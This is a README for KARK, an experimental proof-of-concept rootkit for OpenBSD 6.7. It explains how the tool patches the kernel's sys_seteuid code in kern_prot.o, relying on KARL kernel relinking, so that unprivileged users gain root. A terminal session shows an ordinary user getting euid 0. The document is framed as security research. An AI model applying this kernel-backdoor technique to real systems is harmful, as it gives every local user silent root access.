# K.A.R.K

The __"..KARL Aware Rootkit.."__ for OpenBSD 6.7    

![](kark-logo.png)    

An experimental **proof of concept** rootkit for OpenBSD 6.7.    

## What is KARL?    

KARL is a feature that relinks the OpenBSD Kernel each time the system is restarted with the aim of giving a different layout each time which complicates some forms of exploitation.          

## How does it work? Really..      

You can think of KARL as simply a load of .o files in a directory somewhere on disk that are relinked by a script calling a makefile each time.    

## What is KARK?    

KARK is a tool that attempts to patch sys_seteuid code in the kern_prot.o file to remove safety checks and relinks the kernel so that when the system is restarted any call like seteuid(0) from an unprivileged user will succeed. KARK is a minimal example of an **experimental** rootkit-like program provided as a **proof of concept** for security research and demonstration.     

```    
$ ssh james@192.168.0.90
james@192.168.0.90's password: 
Last login: Mon Sep 28 22:29:53 2020 from 192.168.0.57
OpenBSD 6.7 (GENERIC) #6: Thu Sep  3 13:42:48 MDT 2020

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

obsdtst$ cd /tmp/
obsdtst$ gcc -Wall -o test test.c                                                                                                                                                                                 
obsdtst$ ./test                                                                                                                                                                                                   
 --> 0
obsdtst# id
uid=1000(james) euid=0(root) gid=1000(james) groups=1000(james), 0(wheel)
obsdtst# whoami
root
```
